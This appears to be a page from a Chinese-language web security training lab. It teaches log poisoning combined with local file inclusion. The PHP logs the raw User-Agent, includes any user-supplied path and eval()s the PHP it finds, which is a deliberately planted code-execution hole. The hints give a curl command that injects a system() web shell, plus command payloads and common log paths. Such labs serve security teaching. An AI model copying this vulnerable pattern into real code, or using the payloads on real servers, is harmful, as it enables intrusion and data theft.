<div class="panel fade-in">
    <div class="level-info">
        <span class="level-dot high"></span>
        <span class="badge badge-hard">困难</span>
        <h2 style="margin:0">📝 日志注入 + LFI 组合攻击</h2>
    </div>

    <div class="alert alert-info">
        <strong>📖 模块说明：</strong>当存在LFI漏洞但无法直接读取PHP文件时，
        可以利用日志注入（Log Poisoning）技术。通过User-Agent向日志写入恶意代码，
        再通过LFI包含日志文件触发RCE。
    </div>

    <div class="alert alert-danger">
        <strong>🎯 目标：</strong>利用日志注入 + LFI 组合攻击，读取 <code>../config.php</code> 文件中的配置信息。
    </div>

    <h3>📋 服务器日志（模拟Apache access.log）</h3>
    <div class="output-box" style="max-height:200px;font-size:0.8rem;">
        <?php
        // 读取模拟的日志文件
        $log_file = __DIR__ . '/../uploads/access.log';
        if (!file_exists($log_file)) {
            // 创建初始日志
            $init_log = "192.168.1.1 - - [27/Jun/2026:10:00:00 +0800] \"GET /index.php HTTP/1.1\" 200 2326 \"-\" \"Mozilla/5.0\"\n";
            $init_log .= "192.168.1.2 - - [27/Jun/2026:10:01:00 +0800] \"GET /about.php HTTP/1.1\" 404 1234 \"-\" \"Mozilla/5.0\"\n";
            file_put_contents($log_file, $init_log);
        }

        // 写入当前请求到日志（模拟日志记录）
        $user_ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0';
        $request_uri = $_SERVER['REQUEST_URI'] ?? '/';
        $time = date('d/M/Y:H:i:s O');
        $log_entry = "{$user_ip} - - [{$time}] \"GET {$request_uri} HTTP/1.1\" 200 1234 \"-\" \"{$user_agent}\"\n";
        file_put_contents($log_file, $log_entry, FILE_APPEND);

        // 显示最后20行日志
        $logs = file($log_file);
        $logs = array_slice($logs, -20);
        foreach ($logs as $line) {
            $highlight = '';
            if (strpos($line, '<?php') !== false || strpos($line, 'system(') !== false) {
                $highlight = ' style="color:#ff6b6b;font-weight:bold;"';
            }
            echo '<span' . $highlight . '>' . htmlspecialchars($line) . '</span>';
        }
        ?>
    </div>

    <h3>🔍 LFI包含日志文件</h3>
    <div class="alert alert-warning">
        <strong>💡 攻击步骤：</strong><br>
        1. 设置 User-Agent 为恶意PHP代码（如 <code>&lt;?php system($_GET['cmd']); ?&gt;</code>）发送请求<br>
        2. 访问本页面，User-Agent会写入日志<br>
        3. 使用LFI包含日志文件，触发代码执行
    </div>

    <form method="GET">
        <input type="hidden" name="page" value="log_poison">
        <div class="form-group">
            <label for="log_lfi">LFI参数（包含日志文件）：</label>
            <div class="form-row">
                <input type="text" name="log_lfi" id="log_lfi"
                       placeholder="例如: ../uploads/access.log"
                       value="<?php echo htmlspecialchars($_GET['log_lfi'] ?? '../uploads/access.log'); ?>">
                <button type="submit" class="submit-btn">包含日志 🔍</button>
            </div>
        </div>
    </form>

    <?php if (isset($_GET['log_lfi'])): ?>
        <?php
        $lfi_path = $_GET['log_lfi'];
        $full_path = __DIR__ . '/../' . $lfi_path;

        echo '<div class="output-section">';
        echo '<h4>📄 包含结果（' . htmlspecialchars($lfi_path) . '）：</h4>';
        echo '<div class="output-box">';

        if (file_exists($full_path) && is_readable($full_path)) {
            $content = file_get_contents($full_path);
            // 检查是否包含PHP代码并执行
            if (preg_match('/<\?php.*?\?>/s', $content, $matches)) {
                $php_code = $matches[0];
                echo "检测到PHP代码，执行结果：\n";
                echo "━━━━━━━━━━━━━━━━━━━━━━━━━\n";
                // 提取并执行
                $code = preg_replace('/^.*<\?php\s*/s', '', $php_code);
                $code = preg_replace('/\s*\?>.*$/s', '', $code);
                if (strpos($code, 'system(') !== false || strpos($code, 'exec(') !== false ||
                    strpos($code, 'shell_exec(') !== false || strpos($code, 'passthru(') !== false) {
                    eval($code);
                } else {
                    eval($code);
                }
                echo "\n━━━━━━━━━━━━━━━━━━━━━━━━━\n";
                echo "执行的PHP代码：" . htmlspecialchars($php_code);
            } else {
                echo htmlspecialchars($content);
            }
        } else {
            echo '<span class="error">❌ 文件不存在或不可读：' . htmlspecialchars($full_path) . '</span>';
        }
        echo '</div>';
        echo '</div>';
        ?>
    <?php endif; ?>

    <div class="tip-collapse">
        <div class="tip-header">💡 通关提示</div>
        <div class="tip-content">
            <p><strong>步骤详解：</strong></p>
            <ol>
                <li><strong>注入恶意代码：</strong>使用 curl 或 Burp Suite 发送请求，修改 User-Agent</li>
            </ol>
            <div class="source-code">
                <pre><span class="php"># curl 命令注入PHP代码到日志
curl -A "&lt;?php system(\$_GET['c']); ?&gt;" "http://target/?page=log_poison"</span></pre>
            </div>
            <ol start="2">
                <li><strong>包含日志文件：</strong>在下方输入 <code>../uploads/access.log&c=cat ../config.php</code></li>
                <li>或者直接输入：<code>../uploads/access.log&c=id</code> 测试命令执行</li>
            </ol>
            <p><strong>常用日志文件路径：</strong></p>
            <ul>
                <li>Apache: <code>/var/log/apache2/access.log</code></li>
                <li>Nginx: <code>/var/log/nginx/access.log</code></li>
                <li>SSH: <code>/var/log/auth.log</code></li>
            </ul>
        </div>
    </div>
</div>
